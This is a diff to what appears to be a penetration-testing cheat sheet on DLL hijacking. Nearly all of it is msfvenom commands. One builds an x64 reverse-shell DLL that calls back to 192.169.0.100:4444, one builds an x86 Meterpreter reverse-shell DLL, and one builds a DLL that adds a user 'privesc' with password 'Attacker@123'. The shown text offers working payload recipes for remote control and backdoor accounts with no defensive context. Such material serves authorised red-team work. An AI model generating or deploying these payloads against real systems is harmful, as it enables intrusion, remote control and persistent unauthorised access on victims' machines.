@@ -140,13 +140,19 @@ With the tool **** [**DLLirant**](https://github.com/redteamsocietegenerale/DLLi
 
 ### **Meterpreter**
 
-**Get a reverse shell:**
+**Get rev shell (x64):**
+
+```bash
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
+```
+
+**Get a meterpreter (x86):**
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
 
-**Create a user:**
+**Create a user (x86 I didn't see a x64 version):**
 
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
